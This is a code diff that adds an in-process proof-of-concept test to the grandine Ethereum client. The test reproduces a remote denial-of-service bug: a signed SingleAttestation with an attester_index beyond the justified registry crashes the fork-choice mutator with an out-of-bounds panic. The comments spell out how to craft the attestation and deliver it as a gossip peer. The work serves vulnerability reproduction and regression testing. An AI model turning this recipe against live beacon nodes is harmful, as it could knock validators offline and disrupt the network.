@@ -1,0 +1,406 @@
+diff --git a/fork_choice_control/Cargo.toml b/fork_choice_control/Cargo.toml
+index ff62950..ac17751 100644
+--- a/fork_choice_control/Cargo.toml
++++ b/fork_choice_control/Cargo.toml
+@@ -26,6 +26,7 @@ genesis = { workspace = true }
+ helper_functions = { workspace = true }
+ http_api_utils = { workspace = true }
+ itertools = { workspace = true }
++kzg_utils = { workspace = true }
+ logging = { workspace = true }
+ mime = { workspace = true }
+ nonzero_ext = { workspace = true }
+@@ -56,10 +57,12 @@ types = { workspace = true }
+ 
+ [dev-dependencies]
+ bytesize = { workspace = true }
++deposit_tree = { workspace = true }
+ duplicate = { workspace = true }
+ eth2_cache_utils = { workspace = true }
+ factory = { workspace = true }
+ fs-err = { workspace = true }
++interop = { workspace = true }
+ serde-aux = { workspace = true }
+ spec_test_utils = { workspace = true }
+ tap = { workspace = true }
+@@ -69,3 +72,6 @@ unwrap_none = { workspace = true }
+ 
+ [features]
+ eth2-cache = []
++# Passthrough so `fork_choice_control` tests can select a concrete BLS backend
++# (needed by the CHK-QW-02 in-process reproduction, which signs attestations).
++blst = ["bls/blst", "kzg_utils/blst"]
+diff --git a/fork_choice_control/src/extra_tests.rs b/fork_choice_control/src/extra_tests.rs
+index c997e87..9bcee56 100644
+--- a/fork_choice_control/src/extra_tests.rs
++++ b/fork_choice_control/src/extra_tests.rs
+@@ -2522,3 +2522,293 @@ fn reorganizing_due_to_invalidation_sends_notifications_if_common_ancestor_is_un
+         unfinalized_block_count_total: 1,
+     });
+ }
++
++// ============================================================================
++// CHK-QW-02: SingleAttestation out-of-band attester_index -> unguarded
++// `Store::justified_active_balance` panic (grandine fork-choice).
++//
++// This module is a deterministic, in-process reproduction that replaces the
++// broken libp2p PoC (attester_index = 0xFFFFFFFF + zeroed signature, which can
++// never reach the panic because the signature is verified *before* the mutator
++// and an out-of-registry index is rejected at the pubkey lookup).
++//
++// Step 0 (this measurement) establishes the primitive the attack needs: a
++// validator that is present in a recent (target) state's registry but beyond
++// the justified state's registry length. In Electra a classic Eth1 deposit is
++// queued in `pending_deposits` and only enters `state.validators()` during a
++// later epoch transition; this test prints when that happens.
++// ============================================================================
++mod chk_qw_02 {
++    use std::sync::Arc;
++
++    use pubkey_cache::PubkeyCache;
++    use std_ext::ArcExt as _;
++    use typenum::Unsigned as _;
++    use types::{
++        combined::BeaconState,
++        config::Config,
++        nonstandard::Phase,
++        phase0::{containers::Eth1Data, primitives::H256},
++        preset::{Minimal, Preset},
++        traits::{BeaconState as _, SignedBeaconBlock as _},
++    };
++
++    fn electra_min_config() -> Arc<Config> {
++        Arc::new(Config::minimal().start_and_stay_in(Phase::Electra))
++    }
++
++    #[test]
++    fn measure_deposit_registry_growth_in_electra() {
++        let config = electra_min_config();
++        let pubkey_cache = PubkeyCache::default();
++
++        let (state_0, deposit_tree_0) =
++            factory::min_genesis_state::<Minimal>(&config, &pubkey_cache)
++                .expect("min genesis state");
++
++        let genesis_validators = state_0.validators().len_u64();
++        let block_0_count = state_0.eth1_deposit_index();
++        eprintln!(
++            "[chk-qw-02] genesis: validators={genesis_validators} eth1_deposit_index={block_0_count} \
++             slots_per_epoch={}",
++            <Minimal as Preset>::SlotsPerEpoch::U64
++        );
++
++        // One new classic Eth1 deposit for the next validator index.
++        let new_secret_key = interop::secret_key(block_0_count);
++        let new_deposit_data =
++            interop::quick_start_deposit_data::<Minimal>(&config, &new_secret_key);
++
++        let block_1_count = block_0_count + 1;
++        let deposit_root = deposit_tree_0
++            .clone()
++            .push_and_compute_root(block_0_count, new_deposit_data)
++            .expect("deposit root");
++
++        let mut state_0 = state_0;
++        *state_0.make_mut().eth1_data_mut() = Eth1Data {
++            deposit_root,
++            deposit_count: block_1_count,
++            block_hash: Default::default(),
++        };
++
++        let data_refs = [&new_deposit_data];
++        let block_1_deposits = deposit_tree_0
++            .clone()
++            .extend_and_construct_proofs(
++                data_refs.as_slice(),
++                block_0_count..block_1_count,
++                block_0_count..block_1_count,
++            )
++            .expect("deposit proofs")
++            .try_into()
++            .expect("deposit list");
++
++        let (_, mut state) =
++            factory::block_with_deposits(&config, &pubkey_cache, state_0, 1, block_1_deposits)
++                .expect("deposit block");
++
++        eprintln!(
++            "[chk-qw-02] after deposit block @slot1: validators={} eth1_deposit_index={}",
++            state.validators().len_u64(),
++            state.eth1_deposit_index(),
++        );
++
++        // Advance epoch by epoch and watch when the queued deposit turns into a
++        // real registry entry.
++        let spe = <Minimal as Preset>::SlotsPerEpoch::U64;
++        for epoch in 1..=8u64 {
++            let slot = epoch * spe;
++            let (_, next) =
++                factory::empty_block(&config, &pubkey_cache, state.clone_arc(), slot, Default::default())
++                    .expect("empty block");
++            state = next;
++            eprintln!(
++                "[chk-qw-02] epoch {epoch} @slot{slot}: validators={}",
++                state.validators().len_u64(),
++            );
++        }
++    }
++
++    // Build the "registry gap": deposit one new validator (index == genesis
++    // validator count) so it exists in post-deposit states but is beyond the
++    // genesis/justified registry length. Returns (deposit_block, deposit_state,
++    // new_validator_index, its secret key).
++    struct GapChain {
++        context: crate::helpers::Context<Minimal>,
++        deposit_block: Arc<types::combined::SignedBeaconBlock<Minimal>>,
++        boundary_block: Arc<types::combined::SignedBeaconBlock<Minimal>>,
++        target_state: Arc<BeaconState<Minimal>>,
++        justified_len: u64,
++        oob_index: u64,
++        secret_key: bls::SecretKey,
++    }
++
++    // Build an Electra fork-choice store plus the chain that creates the
++    // "registry gap": the store is anchored at a genesis whose `eth1_data`
++    // already covers one pending deposit, so a deposit block (slot 1) chains
++    // cleanly from the anchor and appends validator index `justified_len`. That
++    // validator is present in every post-deposit state (valid pubkey + signature)
++    // yet sits one past `justified_active_balances.len()` (== the anchor/justified
++    // registry length), which is precisely the out-of-bounds condition.
++    fn build_gap_chain() -> GapChain {
++        let config = Arc::new(Config::minimal().start_and_stay_in(Phase::Electra));
++        let pubkey_cache = Arc::new(PubkeyCache::default());
++
++        let (genesis_state, deposit_tree_0) =
++            factory::min_genesis_state::<Minimal>(&config, &pubkey_cache).expect("min genesis");
++
++        let justified_len = genesis_state.validators().len_u64();
++        let oob_index = justified_len;
++        let secret_key = interop::secret_key(oob_index);
++        let deposit_data = interop::quick_start_deposit_data::<Minimal>(&config, &secret_key);
++
++        let count0 = genesis_state.eth1_deposit_index();
++        let deposit_root = deposit_tree_0
++            .clone()
++            .push_and_compute_root(count0, deposit_data)
++            .expect("deposit root");
++
++        // Anchor at a genesis whose eth1_data covers the pending deposit. Only
++        // eth1_data changes -- the validator registry (and hence
++        // justified_active_balances length) stays at `justified_len`.
++        let mut anchor_state = genesis_state.clone_arc();
++        *anchor_state.make_mut().eth1_data_mut() = Eth1Data {
++            deposit_root,
++            deposit_count: count0 + 1,
++            block_hash: Default::default(),
++        };
++        let anchor_block = Arc::new(genesis::beacon_block(&anchor_state));
++
++        let data_refs = [&deposit_data];
++        let deposits = deposit_tree_0
++            .clone()
++            .extend_and_construct_proofs(data_refs.as_slice(), count0..count0 + 1, count0..count0 + 1)
++            .expect("deposit proofs")
++            .try_into()
++            .expect("deposit list");
++
++        let (deposit_block, deposit_state) =
++            factory::block_with_deposits(&config, &pubkey_cache, anchor_state.clone_arc(), 1, deposits)
++                .expect("deposit block");
++        assert_eq!(deposit_state.validators().len_u64(), justified_len + 1);
++
++        let spe = <Minimal as Preset>::SlotsPerEpoch::U64;
++        let (boundary_block, target_state) = factory::empty_block(
++            &config,
++            &pubkey_cache,
++            deposit_state,
++            spe,
++            H256::repeat_byte(0xab),
++        )
++        .expect("epoch-1 boundary block");
++        assert_eq!(target_state.validators().len_u64(), justified_len + 1);
++
++        let context = crate::helpers::Context::new(config, pubkey_cache, anchor_block, anchor_state, true);
++
++        GapChain {
++            context,
++            deposit_block,
++            boundary_block,
++            target_state,
++            justified_len,
++            oob_index,
++            secret_key,
++        }
++    }
++
++    // The core reproduction: a gossip `SingleAttestation` whose `attester_index`
++    // is a real validator in the target state (valid pubkey + attacker-held key,
++    // so the signature verifies) but beyond the justified registry length. The
++    // Electra singular path never checks committee membership, so the fork-choice
++    // mutator indexes `justified_active_balances[attester_index]` out of bounds.
++    //
++    // On stock grandine this panics the mutator (remote DoS). With `guard.diff`
++    // (bounds-guarded `justified_active_balance`) it is processed as zero-weight
++    // and this test would instead fail the `should_panic` expectation -- i.e.
++    // applying the guard flips this from "panics" to "survives".
++    #[test]
++    #[should_panic(expected = "index out of bounds: the len is 64 but the index is 64")]
++    fn singleattestation_oob_attester_index_reaches_unguarded_justified_balance() {
++        use helper_functions::{accessors, signing::SignForSingleFork as _};
++        use types::{
++            electra::containers::SingleAttestation,
++            nonstandard::RelativeEpoch,
++            phase0::containers::{AttestationData, Checkpoint},
++            traits::BeaconState as _,
++        };
++
++        // 1) Build the registry-gap chain and an Electra store anchored at a
++        //    genesis whose eth1_data already covers the pending deposit.
++        let GapChain {
++            mut context,
++            deposit_block,
++            boundary_block,
++            target_state,
++            justified_len,
++            oob_index,
++            secret_key,
++        } = build_gap_chain();
++        let spe = <Minimal as Preset>::SlotsPerEpoch::U64;
++
++        // 2) Advance the store clock past both blocks BEFORE importing them, so
++        //    they are past (not future) blocks and get imported, and so the
++        //    attestation slot is in the past (else the mutator defers it).
++        context.on_slot(spe + 1);
++        let msgs = context.poc_apply_block(&deposit_block);
++        eprintln!("[chk-qw-02] deposit block @slot1 msgs = {msgs:?}");
++        let msgs = context.poc_apply_block(&boundary_block);
++        eprintln!("[chk-qw-02] boundary block @slot{spe} msgs = {msgs:?}");
++
++        // 3) Craft the malicious SingleAttestation.
++        let target_root = boundary_block.message().hash_tree_root();
++        let att_slot = spe; // first slot of epoch 1, now in the past
++        let committee_index = 0;
++        let data = AttestationData {
++            slot: att_slot,
++            index: 0, // must be 0 for Electra
++            beacon_block_root: target_root,
++            source: target_state.current_justified_checkpoint(),
++            target: Checkpoint {
++                epoch: 1,
++                root: target_root,
++            },
++        };
++        let signature = data
++            .sign(context.poc_config(), &target_state, &secret_key)
++            .into();
++        let single = SingleAttestation {
++            committee_index,
++            attester_index: oob_index,
++            data,
++            signature,
++        };
++
++        let cps = accessors::get_committee_count_per_slot(&target_state, RelativeEpoch::Current)
++            .expect("committees per slot");
++        let subnet = helper_functions::misc::compute_subnet_for_attestation::<Minimal>(
++            cps,
++            att_slot,
++            committee_index,
++        )
++        .expect("subnet");
++
++        eprintln!(
++            "[chk-qw-02] feeding SingleAttestation attester_index={oob_index} \
++             justified_active_balances.len={justified_len} committee_index={committee_index} \
++             subnet={subnet} slot={att_slot}"
++        );
++
++        // 4) Deliver exactly as a remote gossip peer would. The singular path
++        //    accepts it (no committee-membership REJECT) and hands it to the
++        //    fork-choice mutator, which indexes justified_active_balances[64].
++        let outcome = context.poc_on_gossip_single_attestation(single, subnet);
++        eprintln!("[chk-qw-02] gossip layer returned {outcome:?}; joining mutator...");
++
++        // The mutator thread has now panicked at store.rs::justified_active_balance.
++        // Joining it (here, explicitly) propagates the panic to this thread, which
++        // the `#[should_panic]` above asserts. With guard.diff applied the mutator
++        // survives and dropping the context is clean, failing the expectation.
++        drop(context);
++    }
++}
+diff --git a/fork_choice_control/src/helpers.rs b/fork_choice_control/src/helpers.rs
+index 03fb8f6..4d654c7 100644
+--- a/fork_choice_control/src/helpers.rs
++++ b/fork_choice_control/src/helpers.rs
+@@ -643,6 +643,59 @@ impl<P: Preset> Context<P> {
+         self.controller().chain_config()
+     }
+ 
++    // --- CHK-QW-02 PoC accessors -------------------------------------------
++    // Deterministic in-process reproduction of the SingleAttestation
++    // out-of-band `attester_index` -> unguarded `justified_active_balances`
++    // panic. See `singleattestation_oob_attester_index_*` in `extra_tests`.
++
++    #[must_use]
++    pub fn poc_config(&self) -> &Config {
++        self.config()
++    }
++
++    #[must_use]
++    pub fn poc_pubkey_cache(&self) -> &Arc<PubkeyCache> {
++        &self.pubkey_cache
++    }
++
++    /// Apply a block via the gossip path and drain every resulting P2P message,
++    /// returning them for inspection (no acceptance assertion).
++    pub fn poc_apply_block(&mut self, block: &Arc<SignedBeaconBlock<P>>) -> Vec<P2pMessage<P>> {
++        self.controller()
++            .on_gossip_block(block.clone_arc(), GossipId::default());
++        self.controller().wait_for_tasks();
++        let mut messages = Vec::new();
++        while let Some(message) = self.next_p2p_message() {
++            messages.push(message);
++        }
++        messages
++    }
++
++    /// Notify the store that a block's execution payload is valid (drives the
++    /// optimistic import to full validity for post-merge blocks).
++    pub fn poc_notify_valid_payload(&mut self, block: &Arc<SignedBeaconBlock<P>>) {
++        self.on_notified_valid_payload(block);
++    }
++
++    /// Feed a fully attacker-crafted gossip `SingleAttestation` straight into
++    /// the singular-attestation validation + fork-choice mutator, exactly as a
++    /// remote peer would over `beacon_attestation_{subnet_id}`.
++    pub fn poc_on_gossip_single_attestation(
++        &mut self,
++        single: types::electra::containers::SingleAttestation,
++        subnet_id: types::phase0::primitives::SubnetId,
++    ) -> Option<P2pMessage<P>> {
++        self.controller().on_singular_attestation(
++            self.controller().owned_wait_group(),
++            AttestationItem::unverified(
++                Arc::new(Attestation::Single(single)),
++                AttestationOrigin::Gossip(subnet_id, GossipId::default()),
++            ),
++        );
++        self.controller().wait_for_tasks();
++        self.next_p2p_message()
++    }
++
+     fn controller(&self) -> &TestController<P> {
+         self.controller
+             .as_ref()
+@@ -728,6 +781,11 @@ impl Context<Minimal> {
+         Self::with_config(Config::minimal().start_and_stay_in(Phase::Bellatrix))
+             .expect("minimal configuration modified to start in Bellatrix is valid")
+     }
++
++    pub fn electra_minimal() -> Self {
++        Self::with_config(Config::minimal().start_and_stay_in(Phase::Electra))
++            .expect("minimal configuration modified to start in Electra is valid")
++    }
+ }
+ 
+ #[derive(Clone, Copy)]
